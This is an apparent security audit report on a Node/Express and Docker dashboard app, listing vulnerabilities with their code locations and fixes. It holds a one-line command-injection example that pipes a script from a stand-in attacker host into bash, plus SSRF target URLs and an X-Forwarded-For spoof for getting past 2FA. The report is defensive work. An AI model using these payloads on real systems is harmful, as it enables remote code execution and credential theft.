# Security Report: Dashboard App

**Date:** 2026-08-03
**Scope:** Full codebase review — backend, frontend, Docker setup
**Goal:** Identify attack surface and hardening measures for internet exposure

---

## Executive Summary

The app is currently suitable for trusted internal network use only. Before exposing it to the internet, several critical and high-severity issues must be addressed. The most dangerous are: **no TLS**, **command injection** in SSH-compose actions, and **no rate limiting** on authentication endpoints.

---

## Critical Findings

### C1 — No HTTPS / TLS (Cleartext Credentials) ✓ FIXED

**Location:** `frontend/nginx.conf`, `docker-compose.yml`

The frontend only listens on HTTP port 80. All traffic — including Basic Auth credentials and 2FA cookies — is transmitted in cleartext.

**Impact:** Network attacker can passively capture the password and session cookie in a single request.

**Fix:**
- Add TLS termination via a reverse proxy (nginx with Let's Encrypt, Caddy, Traefik) or Cloudflare tunnel.
- Set `secure: true` on the 2FA cookie (`routes/auth.js:38`) — currently missing, so the cookie is sent over HTTP.

---

### C2 — Command Injection via Config Fields ✓ FIXED

**Location:** `backend/src/actions.js:18–23`, `actions.js:38–42`

`compose_dir`, `compose_file`, and `compose_service` values from the database are interpolated directly into shell commands without sanitization:

```js
// actions.js:21
const base = `cd ${mgmt.compose_dir} && docker compose${file} ${dockerAction}`
return mgmt.compose_service ? `${base} ${mgmt.compose_service}` : base
```

```js
// actions.js:38–42 (local exec path)
const filters = `--filter "label=com.docker.compose.project=${projectName}"`
  + (mgmt.compose_service ? ` --filter "label=com.docker.compose.service=${mgmt.compose_service}"` : '')
```

Any authenticated user can create or update an item with a malicious `compose_dir` like `/app; curl attacker.com/shell | bash #` and then trigger the `restart` action.

**Impact:** Remote code execution on the backend container (and through the Docker socket, on the host).

**Fix:**
- Validate `compose_dir`, `compose_file`, and `compose_service` against a strict allowlist pattern (e.g., only alphanumeric, `/`, `-`, `_`, `.`) in `configWriter.js:validate()`.
- Use `ssh2`'s `exec()` with an argument array instead of a shell string, or pass arguments via env vars rather than interpolation.

---

### C3 — Docker Socket Mounted into Backend ✓ FIXED

**Location:** `docker-compose.yml:12`

```yaml
- /var/run/docker.sock:/var/run/docker.sock
```

The backend has full, unrestricted access to the Docker daemon. Any exploit that achieves code execution inside the backend container (e.g., via C2) immediately grants root-level access to the host OS.

**Impact:** Full host compromise.

**Fix:**
- Remove the Docker socket mount if the local-exec feature (localhost Docker control) is not needed in production.
- If it is needed: use a Docker socket proxy (e.g., `Tecnativa/docker-socket-proxy`) that restricts which API calls are allowed.

---

### C4 — SSRF via Health Check / URL Fields ✓ FIXED

**Location:** `backend/src/healthcheck.js:37`

```js
const res = await fetch(url, { signal: controller.signal, redirect: 'follow' })
```

The backend fetches any URL defined in the `url` or `health_check` fields of an item. An authenticated user can set these to internal network addresses:

- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://10.0.0.1/admin` (internal router/admin panel)
- `http://localhost:3001/api/...` (loopback to backend itself)

**Impact:** Internal network scanning; potential credential/metadata exfiltration depending on hosting environment.

**Fix:**
- Validate URLs against an allowlist of schemes (`https`, `http`) and block private IP ranges (RFC 1918: `10.x`, `172.16-31.x`, `192.168.x`, `127.x`, `169.254.x`) before fetching.
- Disable redirects (`redirect: 'manual'`) or at least prevent redirects to private ranges.

---

## High Severity

### H1 — No Rate Limiting on Authentication Endpoints

**Location:** `backend/src/index.js`, `backend/src/routes/auth.js`

No rate limiting is applied anywhere:

- **Basic Auth (`/api/*`):** An attacker can brute-force the password indefinitely. No lockout, no delay.
- **`POST /api/auth/2fa/send`:** Can be called unlimited times, spamming the configured email address and potentially exhausting SMTP quotas.
- **`POST /api/auth/2fa/verify`:** One guess per challenge (challenge is deleted on attempt — good), but combined with unlimited `/2fa/send` calls, an attacker can probe codes repeatedly.

**Fix:**
- Add `express-rate-limit` middleware scoped to auth routes (e.g., 10 attempts / 15 min per IP for login, 5 `/2fa/send` calls / 10 min per IP).
- Consider exponential backoff or IP-based blocking after repeated failures.

---

### H2 — IP Spoofing to Bypass 2FA (`trust proxy: true`)

**Location:** `backend/src/index.js:39`

```js
app.set('trust proxy', true)
```

This makes Express unconditionally trust the `X-Forwarded-For` header from **any** source. If the backend is accessible directly (e.g., exposed port, container network), an attacker can add `X-Forwarded-For: 192.168.1.1` to any request and bypass 2FA entirely if `INTRANET_CIDR=192.168.1.0/24` is set.

**Impact:** Complete 2FA bypass.

**Fix:**
- Change to `app.set('trust proxy', 1)` to trust only the first (nearest) proxy — in this case, nginx.
- Ensure the backend port (3001) is **not** exposed in `docker-compose.yml` (currently it is not — good — but verify no `ports:` are added for debugging).

---

### H3 — `/api/items/import` Overwrites Entire Config

**Location:** `backend/src/routes/items.js:86–97`

Any authenticated user can POST to `/api/items/import` with an arbitrary item array, completely replacing `items.yml`. This can be used to:

- Plant malicious `compose_dir` / `compose_service` values for command injection (see C2).
- Remove all existing items or overwrite SSH credentials.

**Fix:**
- Require a separate, elevated permission or admin confirmation for the import endpoint.
- At minimum, log the full payload and display a confirmation step in the UI.

---

### H4 — No Security Headers in nginx

**Location:** `frontend/nginx.conf`

The nginx configuration sends no HTTP security headers. Missing:

| Header | Risk without it |
|---|---|
| `Content-Security-Policy` | XSS escalation |
| `X-Content-Type-Options: nosniff` | MIME sniffing attacks |
| `X-Frame-Options: DENY` | Clickjacking |
| `Strict-Transport-Security` | SSL stripping (once TLS is added) |
| `Referrer-Policy` | Credential leakage via Referer |

**Fix:** Add a `add_header` block in `nginx.conf`.

---

## Medium Severity

### M1 — 2FA Cookie Missing `secure` Flag

**Location:** `backend/src/routes/auth.js:38`

```js
res.cookie('2fa_token', token, {
  httpOnly: true,
  sameSite: 'strict',
  // secure: true  <-- MISSING
})
```

Without `secure: true`, the cookie is sent over HTTP. Once TLS is added (C1), this must be set simultaneously or the cookie becomes ineffective as a security control.

---

### M2 — Audit Log Lost on Restart (In-Memory Only)

**Location:** `backend/src/auditLog.js`

The audit log is stored in a plain JS array (`const log = []`). Every container restart wipes all history. For a dashboard that manages server reboots and service restarts, this is a significant gap in accountability.

**Fix:** Persist the log to a file (append-only JSON lines) or a lightweight DB (SQLite). At minimum, write to stdout in structured JSON for capture by Docker logging.

---

### M3 — `2fa-tokens.json` Tracked in Git

**Location:** `config/2fa-tokens.json` (recent commit `09a0bed`)

Active device tokens are committed to the repository. Anyone with read access to the git repo can extract valid session tokens and bypass 2FA.

**Fix:**
- Add `config/2fa-tokens.json` back to `.gitignore` and solve the Docker volume mount issue differently (e.g., pre-create the file via an entrypoint script, or use a named volume with an init container).
- Rotate all existing tokens after fixing this.

---

### M4 — `.env` File Mounted into Container

**Location:** `docker-compose.yml:11`

```yaml
- ./.env:/app/.env
```

The raw `.env` file (containing the admin password and SMTP credentials) is mounted as a file inside the container. Any path traversal or arbitrary file read vulnerability gives direct access to it.

**Fix:** Remove the `.env` mount. The backend already receives all values as environment variables — it does not need to read the file itself. The `ENV_FILE=/app/.env` variable and `resetPassword.js` should be adapted accordingly.

---

### M5 — `/api/config` Exposes Internal Network Topology

**Location:** `backend/src/index.js:54–64`

The `/api/config` endpoint returns the full config including SSH hosts, usernames, ports, and compose directories (ssh_key path is redacted). Any authenticated user learns the internal server addresses and usernames.

**Fix:** Remove the `/api/config` endpoint if it is not used by the frontend, or restrict it to admin users only.

---

### M6 — No Username Validation in Basic Auth

**Location:** `backend/src/middleware/auth.js:12–14`

```js
authorizer: (_username, pwd) => basicAuth.safeCompare(pwd, password),
```

The username is ignored (`_username`). Any string with the correct password is accepted. This means credential-stuffing tools that guess usernames will succeed for any username.

**Fix:** Also validate the username against `process.env.DASHBOARD_USER`.

---

### M7 — No Request Body Size Limit

**Location:** `backend/src/index.js:41`

`express.json()` without a `limit` defaults to 100 KB, but large imports or malformed payloads can still cause memory pressure. The `/api/items/import` endpoint in particular accepts unbounded arrays.

**Fix:** Set `express.json({ limit: '1mb' })` and add item count validation in `importConfig()`.

---

## Low / Best Practice

### L1 — SSH Private Keys Could Leak via Error Messages

Error messages from `ssh2` and `fs.readFileSync` may include file paths pointing to key files. These are returned to the client in some error responses. Ensure error messages are sanitized before returning to the client.

### L2 — Health Checks Use `redirect: 'follow'`

Following redirects without restrictions can cause the healthchecker to silently probe addresses different from the configured URL.

### L3 — Audit Log Includes SSH Command Output

`routes/actions.js:31` logs `result.output` (stdout/stderr from SSH commands) to the audit log, which is accessible to all authenticated users via `GET /api/audit-log`. If a command produces sensitive output, it is stored and exposed.

---

## Prioritized Action Plan

### Phase 1 — Must-do before internet exposure

| # | Action | Addresses |
|---|---|---|
| 1 | Add TLS termination (reverse proxy or Cloudflare Tunnel) | C1 |
| 2 | Add `secure: true` to 2FA cookie | C1, M1 |
| 3 | Sanitize `compose_dir`/`compose_file`/`compose_service` with strict regex in validation | C2 |
| 4 | Remove or proxy-restrict Docker socket mount | C3 |
| 5 | Block private IP ranges in health check fetcher | C4 |
| 6 | Add rate limiting to auth endpoints | H1 |
| 7 | Fix `trust proxy` to `1` instead of `true` | H2 |
| 8 | Add nginx security headers | H4 |
| 9 | Validate username in Basic Auth | M6 |

### Phase 2 — Shortly after

| # | Action | Addresses |
|---|---|---|
| 10 | Remove `config/2fa-tokens.json` from git and rotate tokens | M3 |
| 11 | Persist audit log to file | M2 |
| 12 | Remove `.env` file mount from container | M4 |
| 13 | Remove or restrict `/api/config` endpoint | M5 |
| 14 | Restrict `/api/items/import` (confirmation/admin flag) | H3 |

### Phase 3 — Hardening

| # | Action | Addresses |
|---|---|---|
| 15 | Request body size limit | M7 |
| 16 | Sanitize SSH error messages before returning to client | L1 |
| 17 | Disable redirect-following in health checks | L2 |
| 18 | Consider scrubbing SSH output from audit log or access-restricting the log endpoint | L3 |

---

## Quick Reference: Risk Matrix

| ID | Severity | Exploitable Without Auth | Fix Complexity |
|---|---|---|---|
| C1 No TLS | Critical | Yes | Medium |
| C2 Command injection | Critical | No (auth required) | Low |
| C3 Docker socket | Critical | No (post-exploit) | Low |
| C4 SSRF | Critical | No (auth required) | Low |
| H1 No rate limiting | High | Yes | Low |
| H2 IP spoofing | High | Yes (with INTRANET_CIDR set) | Trivial |
| H3 Import overwrites config | High | No | Low |
| H4 No security headers | High | Yes | Trivial |
| M1 Cookie no secure flag | Medium | No | Trivial |
| M2 No persistent audit log | Medium | No | Medium |
| M3 Tokens in git | Medium | Git access needed | Low |
| M4 .env mounted | Medium | No (post-exploit) | Low |
| M5 Config endpoint | Medium | No | Trivial |
| M6 No username check | Medium | No | Trivial |
| M7 No body size limit | Medium | No | Trivial |
